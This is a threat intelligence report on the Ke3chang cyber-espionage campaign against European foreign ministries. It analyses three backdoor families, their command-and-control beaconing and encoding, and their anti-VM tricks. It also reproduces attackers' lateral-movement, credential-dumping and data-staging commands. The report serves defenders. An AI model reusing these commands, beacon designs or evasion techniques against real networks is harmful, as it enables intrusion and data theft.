Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs

1

Executive Summary
Diplomatic missions, including ministries of foreign affairs (MFA), are high-priority targets for today’s
cyber spies. Large-scale cyber espionage campaigns such as “GhostNet” have demonstrated that
government agencies around the world, including embassies, are vulnerable to targeted cyber attacks.1
As the crisis in Syria escalates, FireEye researchers have discovered a cyber espionage campaign, which
we call “Ke3chang,” that falsely advertises information updates about the ongoing crisis to compromise
MFA networks in Europe. We believe that the Ke3chang attackers are operating out of China and
have been active since at least 2010. However, we believe specific Syria-themed attacks against
MFAs (codenamed by Ke3chang as “moviestar”) began only in August 2013. The timing of the attacks
precedes a G20 meeting held in Russia that focused on the crisis in Syria.2
FireEye gained visibility into one of 23 known command-and-control (CnC) servers operated by the
Ke3chang actor for about one week. During this time, we discovered 21 compromised machines
connecting to the CnC server. These included what appear to be three administrative tests by the
attackers and two connections from other malware researchers. Among the targets, we identified nine
compromises at government ministries in five different European countries. Eight of these compromises
were at MFAs.
When FireEye had visibility on the CnC server, we saw the attackers engage in post-compromise
information gathering and lateral movement on the target network, where upon FireEye immediately
contacted the relevant authorities and began the notification process.

The changing face of espionage
Alas, poor James Bond. The days are over when spies had to be both a black belt and Prince Charming
in the same scene. Today, the vast majority of intelligence collection is conducted through signals
intelligence. The ubiquity and vulnerability of the Internet have opened windows into the affairs of
Washington, Beijing, and Moscow to a degree that Bond author, Ian Fleming, would never have imagined.
The advanced persistent threat
The worldwide deployment of espionage-focused malware has made this generation the Golden Age
of espionage. Global reach, stealthy maneuvers, legal cover, and plausible deniability—what more
could a spy ask for? That is why FireEye focuses on the vexing problem of the advanced persistent
threat (APT).
APT activity is best described as a campaign, a series of attacks over time. Each attack comprises a
variety of phases, including reconnaissance, exploitation, command and control, lateral movement,
and exfiltration.3 Intelligence can be extracted during each phase of the attack to build a full
understanding of the tools, techniques, and procedures (TTPs) used by a particular APT campaign’s life
cycle. However, network defenders may have only partial visibility into any single incident. That makes
tracking and correlating activity across multiple related incidents critical.

The Ke3chang campaign
The Ke3chang attackers have been active since at least 2010. Tracking their activity over time has
revealed information on their targeting preferences and the malware tools they use. The attackers have
used three types of malware over the years and have traditionally targeted the aerospace, energy,
government, high-tech, consulting services, and chemicals/manufacturing/mining sectors. However, the
number of attacks against entities in these sectors has been small. The scarcity of individual attacks may
indicate the attackers are selective about their targets.
During August 2013, FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang
attackers. In addition to confirming compromised endpoints at several MFAs, FireEye gained unique
insight into the attackers’ lateral movement activities. In this report, we present the historical intelligence
we have gathered on the Ke3chang campaign, as well as an in-depth assessment of the ongoing
Syrian-themed attacks against these MFAs. Our objective is to arm network defenders with information
to combat this threat actor.

Targeting
Traditionally, the Ke3chang attackers have used spear-phishing emails with either a malware
attachment or a link to a malicious download. They have also leveraged a Java zero-day vulnerability
(CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF
Reader (CVE-2010-2883). The Ke3chang attackers have also sent Windows screensaver files (.scr) and
executable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original
filename extension from the targeted user.4 In addition to the recent Syria-themed campaign, they also
used a London Olympics-themed campaign in 2012 and one that involved former model and French
first lady Carla Bruni in 2011.

Malware analysis and timeline
Over the years, the Ke3chang attackers have used three types of malware that we call: “BS2005”,
“BMW”, and “MyWeb”. We believe these three types of malware are an evolution of a single project
from a single developer or small team of developers sharing code. Functionally, it is a typical first stage
backdoor commonly found in APT attacks. It has the ability to upload and download files, run shell
commands, and sleep for a configurable length of time. All of the CnC communications are performed
over the HTTP protocol.
The current Ke3chang campaign leverages the BS2005 malware, while older activity from 2010-2011
leveraged BMW, followed by the MyWeb malware sporadically used in between.

BS2005: Oct 2011 – present (most recent)
BS2005 campaign: “moviestar”
Just as the media began to report on possible U.S. military intervention in Syria, the Ke3chang attackers
began to use this topic as a lure to trick their targets into running their malware. Although attackers
routinely employ breaking news as lures, the targets of this campaign, codenamed by Ke3chang as
“moviestar”, were various ministries of foreign affairs in Europe.
The malware used in this most recent campaign is known as “BS2005”. One sample was located in a
ZIP file named “US_military_options_in_Syria.zip” (6cb633b371700d1bd6fde49ab38ca471) and contained
the file “US_military_options_in_Syria.pdf.exe” (b68a16cef982e6451ddf26568c60833d). This executable is
a “loader” that contains the process debugging (PDB) string:

c:\BS2005\BS2005\release\Loader.pdb
Upon execution, the loader drops another executable “ie.exe” (277487587ae9c11d7f4bd5336275a906)
that contains the following PDB string:

c:\BS2005\BS2005\release\IE.pdb
This executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of
the backdoor. Upon execution of “ie.exe”, it beacons to a CnC host, named cascais.epac.to
(IP: 122.10.83.51), with the following HTTP traffic pattern:

POST /p3oahin/<filename>.aspx?r=<Base64 Encoded Data>=&a= HTTP/1.1

Host: cascais.epac.to
Content-Length: 4
Connection: Keep-Alive
<Base64 Encoded Data>

FireEye, Inc.

Although this sample uses the “/p3oahin/” path, we have observed earlier samples that used the
path “/ke3chang/” and “/shfam9y/.” The sample we analyzed randomly chooses the <filename>
to use in the URL from the following hard-coded list:
• albumtop.aspx
• blogvideo.aspx
• celebrity.aspx
• modules.aspx
• newpage.aspx
• pratty.aspx
• tieback.aspx
• ugctag.aspx
• verycd.aspx
• worldcat.aspx
In addition, each sample contains a mark or campaign tag, embedded in the Base64 callback
payload that allows the attackers to keep track of their various campaigns. In this case, the mark
in the Syria-themed iteration of this campaign was consistently the “moviestar” tag.
Each byte of the CnC data goes through the following transformation:
• The data has 0x27 plus its positional index number added to it
• It is then XOR’d with its positional index number
• This data is then Base64 encoded, with ‘+’ characters being replaced with ‘*’ characters when
the data is transmitted as a parameter in the URL
The Base64 data for the ‘r’ parameter decodes and decrypts to the following data format:

<Local IP address>
<Computer name>
<Domain>
<Campaign marker>
<Date/Time>
<Command identifier>
<Volume serial number>
<yes/no/nn>
<empty line>
<empty line>

In this format, the <yes/no/nn> indicates whether more data is available for command output
or file upload. An “nn” refers to NOP/NOOP (“NO OPeration”—a beacon signal).

encryption routine

Various versions of the BS2005 malware will use a different constant for the addition part
of the encryption routine and contain other information, such as the following:
• Installed mail client
• Internet Explorer version
• Windows version
• Whether a proxy server is configured
• Whether a virtual machine was detected
In addition to the Base64 data in the URI of the HTTP POST, the BS2005 malware also includes Base64
data in the body of the HTTP POST. The Base64 data for the POST body decodes and decrypts to one
of the following: “no,” uploaded file content, or the output from the previous command.

Once the HTTP POST completes, the response is an HTML page with a hidden form (see Figure 3).
A particular string sequence is expected, which contains a command ID and delimited parameters.
All three malware families that FireEye analyzed (BS2005, MyWeb, and BMW) follow a similar CnC
pattern in their HTTP replies.

At least one of the BS2005 samples contained a simple anti-virtual machine heuristic. Specifically,
the GetTickCount function is called and a loop is executed 999,999,990 times that simply increments
a variable. After this loop completes, GetTickCount is called again and the values are compared.
If they are the same, the process terminates.
A trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM
interface to perform their CnC communication. This programming interface allows the programmer
to reuse code from an existing browser (typically Internet Explorer) to perform Web browsing,
simplifying the development process. The network communication is actually performed through the
browser process, causing some misdirection when it comes to determining which process is ultimately
responsible for generating this network traffic. This technique is nothing new for malware, but FireEye
did notice something interesting in BS2005’s behavior.
BS2005 attempts to kill any processes named “maxthon.exe” or “360se.exe.” The “360se.exe” process
seems to make sense, because it relates to 360 Chinese anti-virus software. But why the malware would
be programmed to terminate Maxthon, a free browser developed by a Chinese company, was
initially unclear.
Upon further investigation, we found that if a Maxthon browser is open while the BS2005 malware uses
this IWebBrowser2 COM interface to navigate to a Web page, the Maxthon browser opens a new tab
and visibly navigates to the Web page itself. Instead of using other APIs to make Web requests and read
responses, the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser
processes running on the target computer. This lack of sophistication is present throughout the code in
all three malware families (BS2005, MyWeb, and BMW). BS2005 is actually the most complex of the three,
which makes sense given that it is the most recent malware family we have seen.
Improvements in the BS2005 version of the malware include a “sleep until date/time” command and
weak encryption for all CnC data; previous iterations (MyWeb and BMW) did not encrypt the host
information sent in the beacon.

BS2005 campaign: “snake”
In 2011 a campaign, labeled “snake” by the attackers, started using the theme of nude photos
of the French prime minister’s wife, Carla Bruni, as a lure. Attackers sent an email to various targets
that encouraged recipients to download a password-protected RAR file (see Figure 5).
The malware contained within the RAR was named “carla_bruni_nude_pics_spp.scr”
(727ef86947f5e109435298e077296a42 ). When executed, the BS2005 malware connected
to a CnC server with the following HTTP traffic pattern:

POST /ke3chang/Directx.aspx?r=<Base64 Encoded Data> HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Accept-Encoding: gzip, deflate
Host: g20news.ns01.us
Content-Length: 4
Connection: Keep-Alive
<Base64 Encoded Data>
The CnC server’s hostname in this case contains the string “g20news”; because of this, FireEye believes
that the targets of the “snake” campaign may have been related to the G20 finance ministers meeting
held in Paris, France on October 15, 2011.

BS2005 campaigns: “dream/dolphin”
In 2012, another series of attacks began that leveraged information about the London Olympics in an
attempt to lure targets into clicking on malicious attachments (see Figure 6 and Figure 7). Based on
information from the FireEye® Dynamic Threat Intelligence™ (DTI) cloud, we observed that this campaign
targeted a single firm in the Chemicals/Manufacturing/Mining sector.
These attacks leveraged older exploits in Adobe PDF Reader (CVE-2010-2883) and Microsoft
Word (CVE-2010-3333). These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc and
b391d47b37841741a1817221b946854a) connected to the following CnC servers:
• news.studenttrail.com
• skyline.ns1.name

The HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path
of “/ke3chang/” to “/shfam9y/”.

POST /shfam9y/Default.aspx?r=<Base64 Encoded Data>a= HTTP/1.1
This could represent an attempt to avoid any network-based signatures that detect based on the
specific URL path of earlier samples. Lastly, the addition constant for the CnC encryption routine in
these two BS2005 samples is 0x7C.

BS2005 campaign: “newtiger”
Three months after the Olympics-themed attacks, FireEye observed a new BS2005 campaign
labeled “newtiger,” which is possibly a reference to an older 2010 campaign labeled “tiger.” The
decoy content in this case is a threat report from a well-known security vendor (see Figure 8). Using
information from the FireEye DTI cloud, FireEye observed that this campaign targeted a single firm
in the Services/Consulting sector.

The sample used in this attack (50dd931b85891168244a10073f4a6f79) dropped BS2005 malware
that connected to the CnC www.trap.dsmtp.com and used the “/shfam9y/” URI path.

MyWeb: Jan 2010 – May 2011
The Ke3chang attackers used the older “MyWeb” malware family from 2010 to 2011. The MyWeb
sample that FireEye analyzed has a compile date of 1/20/2011. At least one of the attacks in this
campaign leveraged a European security and defense-themed lure, which aligns with the targeting
preferences for this group.
MyWeb is the second-generation malware used by this threat actor; it was used after BMW but before
BS2005. Improvements over BMW include an anti-sandbox detection technique, a configurable sleep
value for the CnC beacon loop, and a consolidated configuration block that enables the malware
author to change the CnC domain without having to recompile the malware.
MyWeb’s anti-sandbox detection technique calls GetSystemTime, saving the value, then looping
500,000 times calling GetSystemTime for each loop; finally, the malware compares the milliseconds
value of the last call with the value saved from the first call. If the values are equal, the malware process
terminates silently.
The MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the
portable executable (PE) file. To decode the configuration data, each character has its positional index
number added to it. The CnC domain is stored at offset 0x0. Upon successful connection to the CnC
server, the malware sleeps for the amount of time that is stored in seconds at offset 0x20. The sleep
value used for CnC connection failures is stored in minutes at offset 0x30.

MyWeb only encrypts the command results data sent back to the CnC server using the same weak
encryption algorithm as BS2005 (see Figure 2). The addition constant for the encryption routine for the
sample we analyzed (be58180f4f7ee6a643ab1469a40ffbca) is 0x5A. The beacon data is transmitted
in URL parameters in plaintext and is self-explanatory:

hxxp://ensun.dyndns.org/MYWEB/SearchX.ASpX?id1=<local IP
address>&id2=<computer name>&id3=<volume serial number>&id4=<32 random
alphabet characters>
Downloaded and uploaded files are simply Base64 encoded. Command results are encrypted and
then Base64 encoded.

BMW: July 2010
BMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang
attackers in older 2010 attacks. The initial infection vector is unknown; however, BMW was presumed
to be delivered via weaponized email attachments/links—similar to the newer campaigns leveraging
MyWeb and BS2005. The samples we analyzed have a compile date of 2010/07/08. This malware is
known as BMW, due to the presence of this PDB string:

BMW sample (649691e1d367721f0ff899fd31133915) beacons to CnC mail.yahoo.sendsmtp.com
with the following fake HTTP traffic:

POST /<filename>.aspx?Random=<16 Random Alphabet Characters> HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Accept-Encoding: gzip, deflate
Host: mail.yahoo.sendsmtp.com
Content-Length: 144
Connection: Keep-Alive
<Base64 Encoded Data>
The <filename> in the URI is randomly chosen from one of the following hard-coded entries within
the malware binary:
• acheb.aspx
• bajree.aspx
• cyacrin.aspx
• dauber.aspx
• eaves.aspx
The Base64 encoded data in the POST body decodes to the following:

<Local IP address>
<Computer name>
<Domain>
<Browser version>
<Mail client>
<Campaign marker>
<Date/Time>
<ProxyEnable/ProxyDisable>
<Y/N>
<second parameter of last CnC response>
<Last command executed>
<X Bytes>
<Volume serial number>
The <Y/N> data indicates whether the malware is running inside a virtual machine. The <X Bytes> data
indicates the number of bytes last downloaded from the download file command.
BMW encrypts uploaded and downloaded files and command results before Base64 encoding them,
using the same weak encryption algorithm as BS2005 (see Figure 2). The constant used for addition in
the sample we analyzed is 0x5A.

We have mapped out the relationship between the CnC servers for all three malware families and have
found that they have shared common historical IP addresses in the past.

Figure 11. Common Ke3chang CnC
infrastructure

Using the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then
mapped all the IP addresses that these domains resolved to. We then collected any other domains
that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.

Upon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China,
and Hong Kong.

Ke3chang CnC control panel
Upon accessing one of the Ke3chang CnC servers, we found that the attackers have a Web-based
control panel that allows them to interact with compromised computers, as shown in Figure 14.

The control panel also contains a link to an “AutoScanner” feature that includes several preconfigured
commands to gather information about a compromised system and perform network reconnaissance
on the endpoint (see Figure 15).

Information gathering / lateral movement analysis
Once a compromised system connects to the CnC server, the Ke3chang attackers follow a
predetermined script. They first gather information about the local computer and the network to
which it is connected. FireEye found the following tools on the CnC server, which the attackers
used to steal logon credentials and move laterally across the network:

• a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe
gsecdump v0.7 by [REDACTED] ([REDACTED]@truesec.se)
• 291503be3c25e52382f2a54420d03d71 gsl.exe
gsecdump v0.6 by [REDACTED] ([REDACTED]@truesec.se)
• 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe

After running the standard commands available in the AutoScanner, the attackers often used the
“net group” command to acquire information about specific network groups revealed in the preconfigured commands. This step was done manually; we found several instances of typing errors,
such as the following:

• net group “[REDACTED]” /doamin
• net group /doamin
The attackers then listed information for specific users, focusing on users and groups suspected of
possessing advanced rights such as domain administrators and service accounts that have access
to a wide range of systems.
Then they used the “net use” command to map network drives, including some that required a
password, as follows:

• net use \\[REDACTED] [REDACTED]:J: /user:[REDACTED]
In some cases, they appeared to try and move laterally by copying a file (always initially called
“msn.tmp”) to other machines on the network. They frequently changed the destination directory
and filename of the target file, presumably to make finding the malware more difficult for incident
responders upon initial discovery.

• net use \\172.xx.xx.x [REDACTED] /u:172.xx.xx.x\[REDACTED]
• dir \\172.xx.xx.x\c$
• dir “\\172.xx.xx.x\c$\Program Files\Adobe”
• copy C:\Users\[REDACTED]\AppData\Local\Microsoft\Windows\msm.tmp
“\\172.xx.xx.x\c$\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe” /y
The attackers then deleted the network shares:

• net use \\[REDACTED] /del
After that, attackers gathered specific data of interest (such as the listings of all files in certain
directories), and compressed it all within the RAR archive as follows:

• %temp%/wmp32.dll a -m5 –hp[REDACTED] %temp%/tem.rar %temp%\*dir*.*
They then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from
the compromised system:

• dir %temp%/tem.rar
• del C:\DOCUME~1\[REDACTED]\[REDACTED]\Temp\tem.rar
During our window of visibility, FireEye found evidence that the attackers were able to enumerate the
various target networks, move laterally to compromise new systems, and finally to gather information
that was compressed and uploaded to the CnC server. However, FireEye lost visibility on this Ke3chang
CnC server before the attackers shifted to the major data exfiltration phase.

Attribution Analysis
Determining attribution requires more than just malware analysis.6 It requires an understanding of the
attackers activities across the attack life cycle (or “kill chain”), along with an assessment of contextual
indicators, such as the targeting, timing, and scope of the attacks.7 Unfortunately, this level of visibility
is not always available, which often leaves significant gaps in analysis. Therefore, exploring competing
hypotheses is important, as is recognizing, and acknowledging areas of uncertainty.8
Moreover, “attribution” can have multiple meanings. Some use it to refer to an ultimate beneficiary,
such as a nation-state, while others use the term to refer to malware authors or CnC operators.9
During our investigation, FireEye focused on technical clues left by the malware authors and CnC
operators. Within the malware binaries themselves, linguistic clues point to the malware authors’
use of the Chinese language, as seen in Figure 17.

In addition, the Ke3chang CnC control panel contains a mix of Chinese and English words and
characters. The subset of CnC servers that were not hosted by dynamic DNS infrastructure was
registered using a registrar in China (XIN NET) and the WHOIS records indicate that the registrant is in
China. The following email addresses were used to register those non-dynamic CnC domains:
• xiaoxiao_222@yahoo.com
• tk329@yahoo.com
• zsy@gmail.com
During our period of visibility into the BS2005 “moviestar” campaign against various ministries of
foreign affairs in Europe, FireEye discovered that the attackers had initially tested the malware in
virtual machines, prior to compromising actual targets. We retrieved the output of the commands the
attackers had run when testing the malware. The output indicates that the Ke3chang attackers are
testing their malware in Windows operating systems, with the default language set to Chinese.

the Ke3chang actor after infecting their
test endpoints with BS2005 malware

Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within
China. But their exact identities and motivation remain unknown.

Conclusion
Ministries of foreign affairs in Europe have been targeted and compromised by a threat actor we call
Ke3chang. This attack used the crisis in Syria as a lure to deliver malware to its targets. The timing of the
attack precedes the G20 meeting in Russia that focused on the crisis in Syria. Furthermore, FireEye has
presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and
have attacked targets related to G20 meetings in the past.
During our investigation, we were able to observe the inner workings of one of the CnC servers used by
the attackers. As a result, we were able to identify some of the victims of the attack, as well as gather
circumstantial evidence that indicates that the attackers may be operating from China.
During our brief window of visibility into one of the known 22 CnC nodes, FireEye observed the attackers
conducting reconnaissance and moving laterally throughout the compromised networks. Relevant
authorities were immediately notified upon this discovery, and FireEye began its worldwide target
notification process. At that time, FireEye did not observe the attackers exfiltrating sensitive data;
however, we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data
shortly thereafter.
Accordingly, diplomatic missions, including ministries of foreign affairs, continue to be targeted by
malware-based espionage campaigns.
This report demonstrates that attackers are able to successfully penetrate government targets using
exploits for vulnerabilities that have already been patched and despite the fact that these ministries
have defenses in place. This illustrates the limitations of traditional defenses and highlights the need for
security strategies that not only leverage advanced technologies designed to defend against targeted
threats, but also the incorporation of threat intelligence and an incident response capability.
